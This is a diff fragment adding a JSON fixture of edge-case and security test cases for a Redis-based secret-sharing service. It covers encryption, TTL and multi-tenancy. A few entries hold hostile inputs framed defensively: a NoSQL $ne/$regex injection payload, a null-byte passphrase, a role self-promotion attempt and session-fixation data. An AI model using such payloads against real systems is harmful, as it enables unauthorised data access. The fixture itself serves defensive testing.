+      {
+        "id": "INJ-010",
+        "name": "NoSQL injection in metadata search",
+        "data": {
+          "search_query": {
+            "custid": {"$ne": null},
+            "state": {"$regex": ".*"}
+          }
+        },
+        "assumption_violated": "Redis is immune to NoSQL injection since it's key-value not query-based",
+        "what_breaks": "Redis doesn't have query language like MongoDB so traditional NoSQL injection doesn't apply. BUT if search feature added using Redis JSON module or RedisSearch, query syntax allows: `@state:* @custid:*` matches all. Or if migrated to MongoDB, $ne/$regex bypass filters to dump all secrets",
+        "verification": "If adding search: validate query parameters against whitelist, don't allow raw query objects"
+      }
+    ],
+
+    "encryption_edge_cases": [
+      {
+        "id": "ENC-001",
+        "name": "Passphrase containing null bytes",
+        "data": {
+          "custid": "test@example.com",
+          "secret_value": "sensitive",
+          "passphrase": "pass\\x00word",
+          "ttl": 7200
+        },
+        "assumption_violated": "Passphrase is a normal string without null bytes",
+        "what_breaks": "Null byte (\\x00) in passphrase: if any C-based crypto library treats it as string terminator, passphrase truncated. Encryption uses 'pass', user types 'pass\\x00word'. Passphrase mismatch. Or if null byte in encryption_key calculation, same truncation issue breaks decryption",
+        "verification": "Test that null bytes in passphrase are handled correctly by OpenSSL bindings, not truncated"
+      },
+      {
+        "id": "ENC-002",
+        "name": "Switching encryption key mid-flight",
+        "data": {
+          "secret": {
+            "custid": "test@example.com",
+            "value_encryption": 2,
+            "created_with_global_secret": "old_global_secret_v1"
+          },
+          "current_global_secret": "new_global_secret_v2"
+        },
+        "assumption_violated": "Global secret never changes or rotation is handled",
+        "what_breaks": "Secret encrypted with old global secret. Global secret rotated to new value. decrypt attempts with new secret, fails with CipherError. Fallback secrets logic in try_fallback_secrets handles this, but if experimental.rotated_secrets not configured, all existing secrets become unreadable",
+        "verification": "Ensure rotated_secrets config populated before global secret rotation, test decryption fallback"
+      },
+      {
+        "id": "ENC-003",
+        "name": "Encryption mode version unknown - mode 3",
+        "data": {
+          "secret": {
+            "custid": "test@example.com",
+            "value": "encrypted_blob",
+            "value_encryption": 3
+          }
+        },
+        "assumption_violated": "Only encryption modes -1, 0, 1, 2 exist",
+        "what_breaks": "decrypted_value checks `case value_encryption when -1,0,1,2 else raise RuntimeError`. If value_encryption=3 (from future version or data corruption), raises 'Unknown encryption mode: 3'. Secret unreadable. Needs forward compatibility or migration path",
+        "verification": "Add handling for unknown modes: log error, attempt decryption with current mode, or provide migration tool"
+      },
+      {
+        "id": "ENC-004",
+        "name": "Empty passphrase vs nil passphrase",
+        "data": {
+          "secret_1": {
+            "passphrase": null,
+            "passphrase_temp": null
+          },
+          "secret_2": {
+            "passphrase": "",
+            "passphrase_temp": ""
+          }
+        },
+        "assumption_violated": "nil and empty string treated identically for passphrase",
+        "what_breaks": "has_passphrase? checks `!passphrase.to_s.empty?`. nil.to_s is '', ''.to_s is ''. Both return false (no passphrase). BUT in encryption_key calculation, entropy is `[global_secret, key, passphrase_temp].join(':')`. nil contributes '', empty string contributes ''. Same result BUT in some contexts nil vs '' differ. Redis stores '' not nil",
+        "verification": "Normalize passphrase: convert nil to '' on input to ensure consistency across code paths"
+      },
+      {
+        "id": "ENC-005",
+        "name": "Checksum mismatch after decryption",
+        "data": {
+          "secret": {
+            "value": "corrupted_encrypted_data",
+            "value_checksum": "abc123original",
+            "value_encryption": 2
+          },
+          "decrypted_value": "tampered_content"
+        },
+        "assumption_violated": "Checksum validated after decryption",
+        "what_breaks": "encrypt_value stores checksum: `value_checksum = storable_value.gibbler`. But decrypted_value doesn't verify checksum matches. If encrypted data tampered (bit flip, Redis corruption), decryption succeeds with garbage output. No integrity check catches this. Should compare decrypted.gibbler == value_checksum",
+        "verification": "Add checksum validation in decrypted_value: raise error if decrypted.gibbler != value_checksum"
+      },
+      {
+        "id": "ENC-006",
+        "name": "Encryption with unicode passphrase - encoding issues",
+        "data": {
+          "custid": "test@example.com",
+          "secret_value": "test",
+          "passphrase": "пароль🔐",
+          "ttl": 7200
+        },
+        "assumption_violated": "Passphrase encoding consistent between encryption and decryption",
+        "what_breaks": "User enters passphrase 'пароль🔐' in UTF-8. Encryption: passphrase.bytes creates byte array, joins with ':'. Decryption: user enters same string but in different encoding (UTF-16 in Windows?). Byte representation differs. Passphrase mismatch even though characters identical",
+        "verification": "Force UTF-8 encoding before encryption: passphrase.force_encoding('UTF-8') to normalize"
+      },
+      {
+        "id": "ENC-007",
+        "name": "Decryption with allow_nil_global_secret enabled",
+        "data": {
+          "secret": {
+            "value": "encrypted_with_nil_global_secret",
+            "value_encryption": 2,
+            "key": "test_key"
+          },
+          "config": {
+            "experimental": {
+              "allow_nil_global_secret": true
+            }
+          }
+        },
+        "assumption_violated": "Global secret always exists",
+        "what_breaks": "If OT.global_secret is nil (config missing) and allow_nil_global_secret=true, encryption_key_v2_with_nil uses nil. encryption_key becomes SHA256(':secret_key:passphrase'). Leading colon changes hash. Secrets encrypted with nil global_secret decrypt only with nil global_secret, not portable to normal config",
+        "verification": "allow_nil_global_secret is emergency fallback. Ensure secrets re-encrypted with real global_secret"
+      },
+      {
+        "id": "ENC-008",
+        "name": "Truncation at randomized boundary - length oracle",
+        "data": {
+          "secret_value": "[1MB of 'A' characters for truncation test]",
+          "note": "Generate programmatically: 'A' * 1048576",
+          "size_limit": 100000,
+          "truncation_attempts": ["attempt_1", "attempt_2", "attempt_3"]
+        },
+        "assumption_violated": "Random truncation prevents length inference",
+        "what_breaks": "encrypt_value truncates at `size * (1.0 + rand*0.2)`. Randomness prevents exact length oracle BUT if attacker creates many secrets with same content and observes encrypted length, can average to infer original size within 20% margin. Mitigated but not perfect defense",
+        "verification": "Current implementation is good mitigation. Consider if 20% variance sufficient for threat model"
+      },
+      {
+        "id": "ENC-009",
+        "name": "Gibbler checksum collision",
+        "data": {
+          "secret_1_value": "collision_candidate_1",
+          "secret_2_value": "collision_candidate_2",
+          "both_have_checksum": "same_gibbler_hash"
+        },
+        "assumption_violated": "Gibbler (SHA1) checksums are collision-resistant",
+        "what_breaks": "Gibbler uses SHA1. SHA1 collisions exist (SHAttered attack). If attacker crafts two values with same SHA1, value_checksum matches. Can swap encrypted values between secrets. Decryption succeeds, checksum validates, but wrong content delivered. Breaks confidentiality/integrity",
+        "verification": "Migrate from Gibbler (SHA1) to SHA256 for checksums to prevent collision attacks"
+      },
+      {
+        "id": "ENC-010",
+        "name": "Encryption with empty global secret string",
+        "data": {
+          "global_secret": "",
+          "secret": {
+            "key": "test_key",
+            "passphrase_temp": ""
+          }
+        },
+        "assumption_violated": "Global secret is a strong random string",
+        "what_breaks": "If global_secret is empty string (not nil), encryption_key = SHA256(':key:'). Only protection is secret.key (31 chars random). If key leaked or guessable, encryption is broken. Empty global_secret makes all secrets vulnerable to brute force. Should validate global_secret.length >= 32",
+        "verification": "Add startup validation: raise error if global_secret.to_s.length < 32 or warn loudly"
+      }
+    ],
+
+    "ttl_boundary_violations": [
+      {
+        "id": "TTL-001",
+        "name": "Zero TTL value",
+        "data": {
+          "custid": "test@example.com",
+          "secret_value": "test",
+          "ttl": 0
+        },
+        "assumption_violated": "TTL of 0 means infinite or immediate expiration",
+        "what_breaks": "Redis EXPIRE with 0 seconds immediately deletes key. Secret created then instantly expired before user can access. Or if 0 treated as 'no expiration', secret lives forever. Ambiguous behavior. process_ttl clamps to min_ttl but if bypassed, secret immediately deleted",
+        "verification": "Ensure TTL=0 is rejected or explicitly handled: immediate expiration vs forever with clear docs"
+      },
+      {
+        "id": "TTL-002",
+        "name": "Fractional TTL value - 7200.5 seconds",
+        "data": {
+          "custid": "test@example.com",
+          "secret_value": "test",
+          "ttl": 7200.5
+        },
+        "assumption_violated": "TTL is always an integer",
+        "what_breaks": "to_i truncates: 7200.5.to_i = 7200. User requests 2 hours 0.5 seconds, gets 2 hours. Silent precision loss. Redis EXPIRE accepts integers only so fractional part ignored. If TTL calculation uses floats, rounding errors accumulate over time",
+        "verification": "Validate TTL is integer or round/truncate explicitly with user feedback about precision"
+      },
+      {
+        "id": "TTL-003",
+        "name": "Very large TTL - 100 years",
+        "data": {
+          "custid": "test@example.com",
+          "secret_value": "test",
+          "ttl": 3153600000
+        },
+        "assumption_violated": "Reasonable max TTL is enforced (7-14 days)",
+        "what_breaks": "100 years = 3153600000 seconds. If plan.options[:ttl] is nil, max_ttl fallback is 604800 (7 days). Value clamped to max BUT user expects 100 years, gets 7 days. Silent data corruption. Also, very long TTL means Redis memory held for years, DoS via resource exhaustion",
+        "verification": "Enforce reasonable max TTL (e.g., 30 days) and reject values above with clear error message"
+      },
+      {
+        "id": "TTL-004",
+        "name": "TTL as string instead of integer",
+        "data": {
+          "custid": "test@example.com",
+          "secret_value": "test",
+          "ttl": "7200"
+        },
+        "assumption_violated": "TTL type validation ensures integer",
+        "what_breaks": "Ruby's to_i on '7200' returns 7200 (works). But '7200abc'.to_i returns 7200 (silent truncation). 'abc7200'.to_i returns 0 (dangerous!). If TTL from JSON/form as string, malformed input creates 0 TTL. Secret immediately expires",
+        "verification": "Validate TTL is numeric before to_i conversion: raise error if !ttl.is_a?(Numeric) && !ttl.match?(/^\\d+$/)"
+      },
+      {
+        "id": "TTL-005",
+        "name": "TTL in wrong unit - user sends milliseconds instead of seconds",
+        "data": {
+          "custid": "test@example.com",
+          "secret_value": "test",
+          "ttl": 7200000,
+          "user_intent": "2 hours in milliseconds"
+        },
+        "assumption_violated": "API documentation clearly specifies TTL unit (seconds)",
+        "what_breaks": "User thinks TTL is in milliseconds (common in JavaScript), sends 7200000 for 2 hours. System interprets as seconds = 83.3 days. Secret expires way later than expected. Or if validation rejects as too large, user gets error without understanding why",
+        "verification": "Document TTL unit clearly. Add validation warning if TTL > 1 year: 'Did you mean milliseconds?'"
+      },
+      {
+        "id": "TTL-006",
+        "name": "Metadata TTL calculation overflow",
+        "data": {
+          "secret": {
+            "custid": "test@example.com",
+            "secret_ttl": 2147483647,
+            "lifespan": 2147483647
+          }
+        },
+        "assumption_violated": "metadata_ttl = secret_ttl * 2 doesn't overflow",
+        "what_breaks": "Max 32-bit int is 2147483647. secret_ttl at max, metadata_ttl = 2147483647 * 2 = 4294967294. Overflows 32-bit signed int (wraps to negative). Ruby handles as bignum but Redis EXPIRE might reject negative TTL or wrap to 0. Metadata expires immediately or never",
+        "verification": "Cap secret_ttl at 2^30 (1073741823) to ensure metadata_ttl = secret_ttl * 2 fits in 32-bit int"
+      },
+      {
+        "id": "TTL-007",
+        "name": "Plan TTL limit changes while secret exists",
+        "data": {
+          "secret": {
+            "custid": "paid@example.com",
+            "created": 1700000000,
+            "lifespan": 1209600,
+            "created_with_plan": "premium (14 days TTL)"
+          },
+          "current_plan": "free (7 days TTL max)"
+        },
+        "assumption_violated": "Secret TTL is immutable once created",
+        "what_breaks": "User creates secret on premium plan with 14 day TTL. Downgrades to free plan (max 7 days). Existing secret keeps 14 day TTL (correct behavior). BUT if any code recalculates expiration using current plan, secret shown as 'expires in 7 days' when actually 14. Display bug",
+        "verification": "Always use secret.lifespan for expiration display, never recalculate from current plan settings"
+      },
+      {
+        "id": "TTL-008",
+        "name": "Secret TTL modified after creation",
+        "data": {
+          "secret": {
+            "custid": "test@example.com",
+            "key": "test_secret_key_008",
+            "lifespan": 7200,
+            "ttl_after_creation": 14400
+          }
+        },
+        "assumption_violated": "TTL cannot be changed after secret created",
+        "what_breaks": "Redis EXPIRE can be called multiple times. If secret.ttl updated and save called, Redis TTL resets. User creates secret with 2 hour TTL, hacker modifies to 4 hours. Secret lives longer than intended. Or admin shortens TTL, secret expires early. Breaks user expectations and audit trail",
+        "verification": "Make TTL immutable: validate on save that TTL hasn't changed, or only allow via explicit extend_ttl method with authorization"
+      },
+      {
+        "id": "TTL-009",
+        "name": "TTL calculation with subsecond precision",
+        "data": {
+          "secret": {
+            "created": 1700000000.123,
+            "lifespan": 7200,
+            "check_time": 1700007200.456
+          }
+        },
+        "assumption_violated": "Time.now.to_i truncates to seconds, subsecond precision ignored",
+        "what_breaks": "created and check_time have subsecond precision but to_i truncates. Expiration check: Time.now.to_i (1700007200) >= created.to_i (1700000000) + 7200 = 1700007200. Exactly equal. But actual time is 0.456 seconds past expiration. False positive 'not expired' for subsecond window",
+        "verification": "Consistent use of to_i truncation is fine. Document that TTL granularity is 1 second, not subsecond"
+      },
+      {
+        "id": "TTL-010",
+        "name": "Expired secret not cleaned up by Redis",
+        "data": {
+          "secret": {
+            "custid": "test@example.com",
+            "created": 1700000000,
+            "lifespan": 7200,
+            "redis_expire_command_failed": true
+          },
+          "current_time": 1700010000
+        },
+        "assumption_violated": "Redis automatically deletes expired keys",
+        "what_breaks": "Redis EXPIRE schedules deletion but doesn't guarantee immediate removal. If Redis maxmemory-policy is noeviction and memory full, expired keys not deleted. Application checks secret_expired? (true) but secret.exists? also true. Stale secrets leak memory and remain accessible",
+        "verification": "Use active expiration: before loading secret, check secret_expired? and manually destroy if true"
+      }
+    ],
+
+    "multi_tenancy_issues": [
+      {
+        "id": "TENANT-001",
+        "name": "Customer accessing another customer's secret via guess",
+        "data": {
+          "customer_a": {
+            "custid": "alice@example.com",
+            "secret_key": "abc123def456ghi789"
+          },
+          "customer_b": {
+            "custid": "bob@example.com",
+            "attempts_to_access": "abc123def456ghi789"
+          }
+        },
+        "assumption_violated": "Secret keys are unguessable 31-character random strings",
+        "what_breaks": "Secret key is 31 chars from Familia.generate_id (UUIDv4 sliced). Entropy ~122 bits, practically unguessable. BUT if key generation has weak randomness (broken RNG, timestamp-based), keys become predictable. Or if leaked via logs, analytics, referrer headers, attacker accesses any secret",
+        "verification": "Audit key generation: ensure cryptographically secure random, never log full keys, rotate if leaked"
+      },
+      {
+        "id": "TENANT-002",
+        "name": "Deleted customer's secrets still accessible",
+        "data": {
+          "customer": {
+            "custid": "deleted@example.com",
+            "role": "user_deleted_self",
+            "verified": "false",
+            "ttl": 31536000
+          },
+          "secrets": [
+            {"key": "secret1", "state": "new"},
+            {"key": "secret2", "state": "new"}
+          ]
+        },
+        "assumption_violated": "Deleting customer deletes all their secrets",
+        "what_breaks": "destroy_requested! sets customer TTL to 365 days but doesn't delete secrets. Secrets have own TTL independent of customer. After customer deleted, secrets remain accessible by URL. Orphaned secrets with no owner. Can't identify who created them for abuse reports",
+        "verification": "On customer deletion, either: delete all customer's secrets immediately or document they persist until TTL"
+      },
+      {
+        "id": "TENANT-003",
+        "name": "Anonymous customer creating unlimited secrets",
+        "data": {
+          "custid": "anon",
+          "secrets_created": 10000,
+          "rate_limit_per_custid": 100
+        },
+        "assumption_violated": "Rate limiting per custid prevents abuse",
+        "what_breaks": "All anonymous users share custid='anon'. If rate limit is per custid, limit shared across all anon users. First anon user creates 100 secrets, hits limit. Second anon user blocked even though they created 0. Or if no per-custid limit for anon, one user creates unlimited secrets",
+        "verification": "Rate limit anonymous by IP address + session, not custid. Separate limits for anon vs authenticated"
+      },
+      {
+        "id": "TENANT-004",
+        "name": "Cross-customer metadata enumeration",
+        "data": {
+          "customer_a": "alice@example.com",
+          "customer_b": "bob@example.com",
+          "metadata_keys_sequential": ["metadata:1", "metadata:2", "metadata:3"]
+        },
+        "assumption_violated": "Metadata keys are unpredictable random strings",
+        "what_breaks": "Metadata.generate_id uses Familia.generate_id.slice(0, 31) (random UUIDv4). Keys are unpredictable. BUT if any code exposes metadata list API without filtering by custid, attacker enumerates all metadata. Or if metadata key leaked, can access secret details even if secret URL unknown",
+        "verification": "Ensure metadata API endpoints filter by custid, require authentication, don't allow enumeration"
+      },
+      {
+        "id": "TENANT-005",
+        "name": "Customer email change breaks secret ownership",
+        "data": {
+          "customer": {
+            "original_custid": "old@example.com",
+            "new_custid": "new@example.com"
+          },
+          "secrets": [
+            {"custid": "old@example.com", "key": "secret1"}
+          ]
+        },
+        "assumption_violated": "custid is immutable identifier",
+        "what_breaks": "custid is email address. If user changes email, custid changes. Existing secrets still reference old custid. load_customer on secret fails or loads wrong customer. Secret ownership broken. User can't manage their old secrets. Or if custid reused, new user gains access to old user's secrets",
+        "verification": "Make custid immutable. Store email separately in email field. Or migrate all secret.custid when customer email changes"
+      },
+      {
+        "id": "TENANT-006",
+        "name": "Session fixation via shared sessid",
+        "data": {
+          "customer_a": {
+            "custid": "alice@example.com",
+            "sessid": "shared_session_id_123"
+          },
+          "customer_b": {
+            "custid": "bob@example.com",
+            "sessid": "shared_session_id_123"
+          }
+        },
+        "assumption_violated": "Each customer has unique session ID",
+        "what_breaks": "If two customers assigned same sessid (collision or manual manipulation), they share session. load_or_create_session loads same session object. Session data (cust ID, permissions) overwritten by last write. User A logs in, session says custid=alice. User B logs in with same sessid, session says custid=bob. User A now authenticated as bob. Session fixation attack",
+        "verification": "Ensure sessid uniqueness, validate session.custid matches current user on each request"
+      },
+      {
+        "id": "TENANT-007",
+        "name": "API token leaked via logs or analytics",
+        "data": {
+          "customer": {
+            "custid": "victim@example.com",
+            "apitoken": "secret_api_token_abcdef123456"
+          },
+          "leaked_via": ["application logs", "error tracking", "analytics events"]
+        },
+        "assumption_violated": "API tokens are never logged or exposed",
+        "what_breaks": "If apitoken logged in error messages, debug logs, or sent to analytics (Mixpanel, etc), attacker gains full account access. apitoken is permanent until regenerated. Used in API authentication. Leaked token allows creating secrets, reading metadata, modifying account as victim",
+        "verification": "Audit all logging: filter apitoken before logging, use partial token (first 6 chars) for debugging"
+      },
+      {
+        "id": "TENANT-008",
+        "name": "Privilege escalation via role field manipulation",
+        "data": {
+          "customer": {
+            "custid": "attacker@example.com",
+            "role": "customer",
+            "attempted_role_change": "colonel"
+          }
+        },
+        "assumption_violated": "Role changes require privileged authorization",
+        "what_breaks": "If customer update API allows setting role field without validation, user can self-promote to 'colonel'. Or if role checked using role?('colonel') but role set via mass assignment, privilege escalation. Customer.create forces role='customer' but update might not validate",
+        "verification": "Whitelist role values, require admin authorization for role changes, validate role on every update"
+      },
+      {
+        "id": "TENANT-009",
+        "name": "Stripe customer ID collision between customers",
+        "data": {
+          "customer_a": {
+            "custid": "alice@example.com",
+            "stripe_customer_id": "cus_ABC123"
+          },
+          "customer_b": {
+            "custid": "bob@example.com",
+            "stripe_customer_id": "cus_ABC123"
+          }
+        },
+        "assumption_violated": "Each customer has unique Stripe customer ID",
+        "what_breaks": "If two customers assigned same stripe_customer_id (manual error or webhook duplicate), billing breaks. Charges for customer A applied to B's account. Subscription cancellation affects wrong user. get_stripe_customer returns same Stripe object for both. Financial loss and data breach",
+        "verification": "Add unique constraint on stripe_customer_id, validate on assignment, reconcile with Stripe regularly"
+      },
+      {
+        "id": "TENANT-010",
+        "name": "GLOBAL customer accessing secrets as regular customer",
+        "data": {
+          "customer": {
+            "custid": "GLOBAL",
+            "role": "customer",
+            "attempting_secret_access": true
+          }
+        },
+        "assumption_violated": "GLOBAL customer is special system account, not regular user",
+        "what_breaks": "Customer.global creates custid='GLOBAL' for system-wide counters (secrets_created, etc). If GLOBAL exposed via API or user creates account with custid='GLOBAL', collision. global? check returns true, increment_field returns early. System counters broken. Or if GLOBAL creates secrets, they're attributed to system not user",
+        "verification": "Reserve 'GLOBAL', 'anon' as system custids. Reject customer creation with these IDs. Make global customer immutable"
+      }
+    ]
+  }
+}
